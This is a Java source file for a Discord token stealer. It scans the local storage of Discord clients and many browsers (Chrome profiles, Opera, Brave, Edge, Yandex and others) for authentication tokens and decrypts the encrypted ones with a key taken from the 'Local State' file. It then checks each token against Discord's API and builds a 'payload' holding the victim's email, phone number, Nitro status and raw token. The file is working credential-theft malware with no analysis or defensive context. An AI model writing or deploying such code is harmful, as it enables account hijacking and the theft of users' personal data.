package cc.breadcat.handlers;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import javax.net.ssl.HttpsURLConnection;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;
import java.util.Vector;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

import static cc.breadcat.utils.encryptionUtils.decrypt;
import static cc.breadcat.utils.encryptionUtils.getKey;

public class discordHandler {
    private static File appData = new File(System.getenv("APPDATA"));
    private static File localAppData = new File(System.getenv("LOCALAPPDATA"));
    private static final Pattern tokenRegex = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}");
    private static final Pattern encTokenRegex = Pattern.compile("dQw4w9WgXcQ:[^\"]*");
    private static final HashMap<String, String> paths = new HashMap<String, String>() {
        {
            put("Discord", appData + "\\discord\\Local Storage\\leveldb");
            put("Discord Canary", appData + "\\discordcanary\\Local Storage\\leveldb");
            put("Discord PTB", appData + "\\discordptb\\Local Storage\\leveldb");
            put("Lightcord", appData + "\\Lightcord\\Local Storage\\leveldb");
            put("Opera", appData + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb");
            put("Opera GX", appData + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb");
            put("Amigo", localAppData + "\\Amigo\\User Data\\Local Storage\\leveldb");
            put("Torch", localAppData + "\\Torch\\User Data\\Local Storage\\leveldb");
            put("Kometa", localAppData + "\\Kometa\\User Data\\Local Storage\\leveldb");
            put("Orbitum", localAppData + "\\Orbitum\\User Data\\Local Storage\\leveldb");
            put("CentBrowser", localAppData + "\\CentBrowser\\User Data\\Local Storage\\leveldb");
            put("7Star", localAppData + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb");
            put("Sputnik", localAppData + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb");
            put("Vivaldi", localAppData + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb");
            put("Chrome SxS", localAppData + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb");
            put("Chrome", localAppData + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
            put("Chrome1", localAppData + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb");
            put("Chrome2", localAppData + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb");
            put("Chrome3", localAppData + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb");
            put("Chrome4", localAppData + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb");
            put("Chrome5", localAppData + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb");
            put("Epic Privacy Browser", localAppData + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb");
            put("Microsoft Edge", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb");
            put("Uran", localAppData + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb");
            put("Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb");
            put("Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");
            put("Iridium", localAppData + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb");
        }
    };

    private static JsonObject checkToken(String token) {
        //send a request to discord to check if the token is valid
        try {
            String url = "https://discord.com/api/v9/users/@me";
            //connect to the url via https
            //if the response code is 200, the token is valid
            JsonObject user;
            HttpsURLConnection userCon = (HttpsURLConnection) new URL(url).openConnection();
            userCon.setRequestProperty("Authorization", token);
            userCon.setRequestProperty("Content-Type", "application/json");
            userCon.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
            if (!(userCon.getResponseCode() == 200)) return null;
            BufferedReader reader = new BufferedReader(new java.io.InputStreamReader(userCon.getInputStream()));
            StringBuilder builder = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                builder.append(line);
                builder.append(System.lineSeparator());
            }
            user = new Gson().fromJson(builder.toString(), JsonObject.class);
            reader.close();
            builder.setLength(0);

            JsonObject nitro;
            HttpsURLConnection nitroCon = (HttpsURLConnection) new URL(url + "/billing/subscriptions").openConnection();
            nitroCon.setRequestProperty("Authorization", token);
            nitroCon.setRequestProperty("Content-Type", "application/json");
            nitroCon.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
            if ((nitroCon.getResponseCode() == 200)) {
                reader = new BufferedReader(new java.io.InputStreamReader(nitroCon.getInputStream()));
                while ((line = reader.readLine()) != null) {
                    builder.append(line);
                    builder.append(System.lineSeparator());
                }
                try {
                    nitro = new Gson().fromJson(builder.toString(), JsonArray.class).get(0).getAsJsonObject();
                    if (nitro != null) user.addProperty("nitro", nitro.get("type").getAsInt());
                    else user.addProperty("nitro", 0);
                } catch (Exception e) {
                    user.addProperty("nitro", 0);
                }
            }
            return user;
        } catch (Exception e) {
            return null;
        }
    }

    private Vector<String> tokens = new Vector<String>();

    public JsonArray getTokens() {
        crawl();
        return preparePayload();
    }
    private JsonArray preparePayload() {
        JsonArray users = new JsonArray();
        for (String token : this.tokens) {
            JsonObject userInfo = checkToken(token);
            if (userInfo == null) continue;
            JsonObject userObject = new JsonObject();
            userObject.addProperty("id", userInfo.get("id").getAsString());
            userObject.addProperty("username", userInfo.get("username").getAsString() + "#" + userInfo.get("discriminator").getAsString());
            userObject.addProperty("email", userInfo.get("email").getAsString());
            userObject.addProperty("phone", (userInfo.get("phone").getAsString() != null) ? userInfo.get("phone").getAsString() : "None");
            userObject.addProperty("badge", userInfo.get("flags").getAsString());
            userObject.addProperty("nitro", userInfo.get("nitro").getAsBoolean());
            userObject.addProperty("verified", userInfo.get("verified").getAsBoolean());
            userObject.addProperty("token", token);
            users.add(userObject);
        }
        return users;
    }
    private void crawl() {
        for (String key : paths.keySet()) {
            File path = new File(paths.get(key));
            if(!path.exists()) continue;
            if (key.contains("iscord")) {
                crawlEncrypted(path);
            }
            crawlUnencrypted(path);
        }
    }
    private void crawlEncrypted(File path) {
        try {
            File localState = new File(path.getParentFile().getParentFile(), "Local State");
            byte[] key = getKey(localState);
            for (File file : path.listFiles()) {
                for (String encToken: regexFile(encTokenRegex, file)) {
                    String token = decrypt(Base64.getDecoder().decode(encToken.replace("dQw4w9WgXcQ:","").getBytes()), key);
                    if (this.tokens.contains(token)) continue;
                    this.tokens.add(token);
                }
            }
        } catch (Exception e) {
        }
    }
    private void crawlUnencrypted(File path) {
        for (File file : path.listFiles()) {
            for (String token : regexFile(tokenRegex, file)) {
                if (this.tokens.contains(token)) continue;
                this.tokens.add(token);
            }
        }
    }


    private static Vector<String> regexFile(Pattern pattern, File file) {
        Vector<String> result = new Vector<String>();
        try {
            BufferedReader reader = new BufferedReader(new FileReader(file));
            StringBuilder content = new StringBuilder();
            while (reader.ready()) {
                content.append(reader.readLine());
            }
            reader.close();
            Matcher crawler = pattern.matcher(content.toString());
            while (crawler.find() && !result.contains(crawler.group())) {
                result.add(crawler.group());
            }
        } catch (Exception e) {
        }
        return result;
    }
}